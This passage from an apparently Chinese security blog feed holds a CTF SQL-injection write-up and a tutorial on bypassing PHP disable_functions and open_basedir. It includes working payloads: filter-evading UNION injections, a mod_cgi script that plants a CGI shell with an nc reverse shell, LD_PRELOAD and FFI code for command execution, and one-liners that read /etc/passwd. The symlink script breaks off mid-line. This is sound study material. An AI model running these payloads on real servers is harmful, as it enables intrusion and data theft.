title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><ol><li>注入点在广告名。点击广告详情，发现数据库的报错信息，证明存在注入。</li></ol><p>简单测试了一下，空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</p><p>首先测试字段数量,有22个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line">#group by获取列数</span><br><span class="line">-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;11</span><br></pre></td></tr></table></figure><p>查看数据库版本信息,是MariaDB</p><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322231728123.png" alt></p><p>由于过滤了or,所以用mysql.innodb_table_stats查询数据表或者用sys.schema_auto_increment_columns</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232338100.png" alt></p><p>查询users表，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200322232819155.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> MySQL无列名注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass disabled_functions &amp; open_basedir学习</title>
      <link href="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​        常见的有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web  应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有  system()、exec()、shell_exec()、passthru()，偏僻 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改  .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD  劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><h3 id="0x-02-黑名单-bypass"><a href="#0x-02-黑名单-bypass" class="headerlink" title="0x 02 黑名单 bypass"></a>0x 02 黑名单 bypass</h3><p>众所周知，disable_functions 是基于黑名单来实现对某些函数使用的限制的，既然是黑名单有时候就难免会有漏网之鱼</p><p>PHP 中能直接执行系统程序的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">shell_exec(）</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">dl() &#x2F;&#x2F; 加载自定义 php 扩展</span><br></pre></td></tr></table></figure><p>PHP 中执行运算符（反引号）的效果和 shell_exec() 是相同的</p><h3 id="0x-03-第二种：mod-cgi-bypass介绍"><a href="#0x-03-第二种：mod-cgi-bypass介绍" class="headerlink" title="0x 03 第二种：mod_cgi bypass介绍"></a>0x 03 第二种：mod_cgi bypass介绍</h3><p>关于mode_cgi，可以参考apache的官方说明：<a href="http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html。" target="_blank" rel="noopener">http://man.chinaunix.net/newsoft/ApacheManual/mod/mod_cgi.html。</a></p><blockquote><p>“任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。”，这就表示，apache允许WEB服务器与可执行文件进行交互。</p></blockquote><p>满足条件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. apache环境</span><br><span class="line">2. mod_cgi已启用</span><br><span class="line">3. htaccess的文件必须被允许，即在httpd.conf中，要注意AllowOverride选项为All</span><br><span class="line">4. 你必须能够写入文件</span><br></pre></td></tr></table></figure><p>攻击思路：先把要执行的程序写入一个特定扩展名的文件里，然后修改.htaccess文件，通过Options指令允许使用mod_cgi模块执行CGI脚本，然后再让我们特定的扩展名以cgi-script进行处理，这样我们甚至可以反弹一个shell出来。</p><p>POC如下，附注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"nc -c'/bin/bash' 127.0.0.1 4444"</span>; <span class="comment">//反弹一个shell出来，这里用本地的4444端口</span></span><br><span class="line">$shellfile =<span class="string">"#!/bin/bash\n"</span>; <span class="comment">//指定shell</span></span><br><span class="line">$shellfile .=<span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//需要指定这个header，否则会返回500</span></span><br><span class="line">$shellfile .=<span class="string">"$cmd"</span>; </span><br><span class="line">functioncheckEnabled($text,$condition,$yes,$no) <span class="comment">//this surely can be shorter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ?$yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); </span><br><span class="line">    header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>]. <span class="string">'?checked=true'</span>); <span class="comment">//执行环境的检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $modcgi = in_array(<span class="string">'mod_cgi'</span>,apache_get_modules()); <span class="comment">// 检测mod_cgi是否开启</span></span><br><span class="line">    $writable = is_writable(<span class="string">'.'</span>); <span class="comment">//检测当前目录是否可写</span></span><br><span class="line">    $htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]);<span class="comment">//检测是否启用了.htaccess</span></span><br><span class="line">        checkEnabled(<span class="string">"Mod-Cgienabled"</span>,$modcgi,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"Iswritable"</span>,$writable,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"htaccessworking"</span>,$htaccess,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error. All of the above mustbe true for the script to work!"</span>; <span class="comment">//必须满足所有条件</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line"> checkEnabled(<span class="string">"Backing </span></span><br><span class="line"><span class="string">up.htaccess"</span>,copy(<span class="string">".htaccess"</span>,<span class="string">".htaccess.bak"</span>),<span class="string">"Suceeded!Saved in </span></span><br><span class="line"><span class="string">.htaccess.bak"</span>,<span class="string">"Failed!"</span>); <span class="comment">//备份一下原有.htaccess</span></span><br><span class="line">        </span><br><span class="line">checkEnabled(<span class="string">"Write </span></span><br><span class="line"><span class="string">.htaccessfile"</span>,file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"Options </span></span><br><span class="line"><span class="string">+ExecCGI\nAddHandlercgi-script </span></span><br><span class="line"><span class="string">.dizzle"</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//.dizzle，我们的特定扩展名</span></span><br><span class="line">        checkEnabled(<span class="string">"Write shellfile"</span>,file_put_contents(<span class="string">'shell.dizzle'</span>,$shellfile),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//写入文件</span></span><br><span class="line">        checkEnabled(<span class="string">"Chmod777"</span>,chmod(<span class="string">"shell.dizzle"</span>,<span class="number">0777</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>);<span class="comment">//给权限</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;"</span>; <span class="comment">//调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>具体攻击方法可以看这篇文章：<a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p><h3 id="0x-04-第四种：-LD-PRELOAD-bypass介绍"><a href="#0x-04-第四种：-LD-PRELOAD-bypass介绍" class="headerlink" title="0x 04 第四种： LD_PRELOAD bypass介绍"></a>0x 04 第四种： LD_PRELOAD bypass介绍</h3><p>这里需要介绍一个前置知识：</p><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><blockquote><p>LD_PRELOAD 是 Linux 下的一个环境变量,动态链接器在载入一个程序所需的所有动态库之前,首先会载入LD_PRELOAD 环境变量所指定的动态库。</p></blockquote><p>从上面可以看出本来LD_PRELOAD的作用是利用我们加载进来的so，去覆盖相同函数名的库函数，去使用自己的函数，更加方便，但是如果自己的函数为恶意函数，就造成了恶意程序注入。</p><p>利用 putenv 设置LD_PRELOAD变量，既能绕过open basedir，又能绕过disable functions</p><h5 id="putenv可以设置环境变量"><a href="#putenv可以设置环境变量" class="headerlink" title="putenv可以设置环境变量"></a>putenv可以设置环境变量</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure><p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。<br>如果该函数未被过滤，那么我们可以有如下骚操作：</p><p>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library<br>4.成功进行RCE<br><img src="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/2019-03-25-15-17-11.png" alt="img"></p><p>对LD_PRELOAD的利用大概可分为两种，第一种是劫持库函数，第二种是劫持启动进程</p><ul><li>劫持库函数</li></ul><p>网上大多数都是劫持的getuid，其实能劫持的并不只getuid,我们需要劫持的函数需要满足，此函数为点：<strong>经常被用到的并且为无参数的函数</strong></p><p>比如getuid,getpid,getgid,getppid这种，具体的可以fuzz一下，应该蛮多的</p><p>具体操作过程(以geteuid的劫持为例)</p><p>hack.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">        system(&quot;whoami &gt; hack&quot;);</span><br><span class="line">&#125;   </span><br><span class="line">int  geteuid() &#123;</span><br><span class="line">if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成so文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure><p>写一个hack.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);&#x2F;&#x2F;error_log(&#39;&#39;,1); </span><br><span class="line">&#x2F;&#x2F;imap_mail(&#39;a@a&#39;,1,1,1,1);</span><br><span class="line">&#x2F;&#x2F;$img &#x3D; new Imagick(&#39;test.wmv&#39;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;mail()函数执行默认是会调用外部程序sendmail的</span><br></pre></td></tr></table></figure><p>而既然要在php运行时被触发，那么势必选择一个非常常用的函数才行。这里能调用的函数不止有mail，在mail函数被ban掉的情况下也可以用error_log，imap_mail等，需要注意的是error_log的第二个参数需要设置为1表示发送邮件会调用sendmail进程，imap_mail也可调用sendmail进程，即可调用sendmail子进程，同样利用Imagick函数触发调用了新进程ffmpeg进行处理图像</p><p>imap_mail()适用于<code>PHP &lt; 5.6.2</code>的</p><p>使用Imagick函数的时候，MPEG format文件必须存在，否则无法调用<code>ffmpeg</code></p><ul><li>劫持启动进程</li></ul><p>从上面来看，劫持库函数需要找到特定的库函数去劫持，那么劫持新进程是不需要找到特定的库函数的。</p><blockquote><p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p></blockquote><p><strong>attribute</strong>((constructor))更加直接的去讲：有这个说明：</p><p><strong>它是在加载共享库时运行的，通常是在程序启动过程中</strong>，也就是当有一个新进程/子进程启动时，那么<strong>attribute</strong>((constructor))就会被直接加载，我们上面的mail等函数也正好符合这个特性，下面也接着来试一下:</p><p>hack.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hack.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">error_log(&#39;&#39;,1);</span><br></pre></td></tr></table></figure><h3 id="0x-05-其他bypass技巧介绍"><a href="#0x-05-其他bypass技巧介绍" class="headerlink" title="0x 05 其他bypass技巧介绍"></a>0x 05 其他bypass技巧介绍</h3><h4 id="外部扩展库dl-bypass介绍"><a href="#外部扩展库dl-bypass介绍" class="headerlink" title="外部扩展库dl bypass介绍"></a>外部扩展库dl bypass介绍</h4><blockquote><p>实现方法参考：<a href="https://cloud.tencent.com/developer/article/1141142" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1141142</a></p></blockquote><blockquote><table><thead><tr><th>版本</th><th>说明</th></tr></thead><tbody><tr><td>7.0.0</td><td>PHP-FPM 模式下已禁用 <strong>dl()</strong>。</td></tr><tr><td>5.3.9</td><td>尽管不推荐，但 PHP-FPM 模式下启用了 <strong>dl()</strong>。</td></tr><tr><td>5.3.0</td><td>由于稳定性，<strong>dl()</strong> 在某些 SAPI 中被禁用。仅仅允许 <strong>dl()</strong> 的 SAPI 为 CLI 和 Embed。 使用 <a href="https://www.php.net/manual/zh/ini.core.php#ini.extension" target="_blank" rel="noopener">扩展加载指令</a> 作为替代。</td></tr></tbody></table></blockquote><blockquote><p>SAPI（Server Application Programming Interface）服务器应用程序编程接口，即PHP与其他应用交互的接口，PHP脚本要执行有很多方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。</p><p>SAPI提供了一个和外部通信的接口，常见的SAPI有：cgi、fast-cgi、cli、apache模块的DLL、isapi</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server API FPM&#x2F;FastCGI</span><br></pre></td></tr></table></figure><p>条件：php.ini中需设置enable_dl=true</p><p>dl bypass-poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpdl(&quot;dl.so&quot;);  &#x2F;&#x2F;dl.so在extension_dir目录，如不在则用..&#x2F;..&#x2F;来实现调用confirm_dl_compiled(&quot;$_GET[a]&gt;;1.txt&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>主要就是dl.so这个文件的搜索，通过调用dl.so进行命令执行。</p><h4 id="PHP7-4-FFI-bypass介绍"><a href="#PHP7-4-FFI-bypass介绍" class="headerlink" title="PHP7.4-FFI bypass介绍"></a>PHP7.4-FFI bypass介绍</h4><p>在RCTF2019中出的题，考察了php7.4的新特性，通过新加的FFI即可bypass disable function</p><p>参考RCTF2019RCTF 2019 nextphp <a href="https://xz.aliyun.com/t/5218" target="_blank" rel="noopener">https://xz.aliyun.com/t/5218</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"></span><br><span class="line">$ffi-&gt;system(<span class="string">"id"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果只定义 system 函数而省略 libc.so.6 同样也是可以执行命令的，支持 RTLD_DEFAULT 的平台将尝试在常规全局范围内查找在代码中声明的符号</p><p> 当我们只能控制 FFI::cdef 函数的 lib 参数的时候，FFI::cdef 函数还可以加载我们自定义的动态链接库，但是需要填写绝对路径，否则会无法加载，比如</p><p>ffi.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">        <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">        <span class="string">"/var/www/html/bad.so"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>bad.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">j0k3r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"echo Hacked &amp;&amp; id"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要加载编译好的 bad.so 即可执行恶意代码</p><h3 id="0x-06-常用的bypass链接"><a href="#0x-06-常用的bypass链接" class="headerlink" title="0x 06 常用的bypass链接"></a>0x 06 常用的bypass链接</h3><blockquote><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">some exploits in php7</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass disable_functions via LD_PRELOAD</a> 利用劫持启动进程+mail()函数实现</p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p></blockquote><h3 id="0x-07-Bypass-open-basedir"><a href="#0x-07-Bypass-open-basedir" class="headerlink" title="0x 07 Bypass open_basedir"></a>0x 07 Bypass open_basedir</h3><h4 id="chdir-bypass"><a href="#chdir-bypass" class="headerlink" title="chdir bypass"></a>chdir bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读配置文件cmd&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file_get_contents(&quot;&#x2F;etc&#x2F;passwd&quot;));</span><br><span class="line">列目录cmd&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">读文件md&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);readfile(&quot;&#x2F;THis_Is_tHe_F14g&quot;));</span><br></pre></td></tr></table></figure><h4 id="利用symlink-函数来Bypass"><a href="#利用symlink-函数来Bypass" class="headerlink" title="利用symlink()函数来Bypass"></a>利用symlink()函数来Bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line">* by phithon</span><br><span class="line">* From https:&#x2F;&#x2F;www.leavesongs.com</span><br><span class="line">* detail: http:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2009110068</span><br><span class="line">*&#x2F;</span><br><span class="line">header(&#39;content-type: text&#x2F;plain&#39;);</span><br><span class="line">error_reporting(-1);</span><br><span class="line">ini_set(&#39;display_errors&#39;, TRUE);</span><br><span class="line">printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#39;open_basedir&#39;), phpversion());</span><br><span class="line">printf(&quot;disable_functions: %s\n&quot;, ini_get(&#39;disable_functions&#39;));</span><br><span class="line">$file &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, isset($_REQUEST[&#39;file&#39;]) ? $_REQUEST[&#39;file&#39;] : &#39;&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">$relat_file &#x3D; getRelativePath(__FILE__, $file);</span><br><span class="line">$paths &#x3D; explode(&#39;&#x2F;&#39;, $file);</span><br><span class="line">$name &#x3D; mt_rand() % 999;</span><br><span class="line">$exp &#x3D; getRandStr();</span><br><span class="line">mkdir($name);</span><br><span class="line">chdir($name);</span><br><span class="line">for($i &#x3D; 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;</span><br><span class="line">    mkdir($paths[$i]);</span><br><span class="line">    chdir($paths[$i]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir($paths[$i]);</span><br><span class="line">for ($i -&#x3D; 1; $i &gt; 0; $i--) &#123; </span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$paths &#x3D; 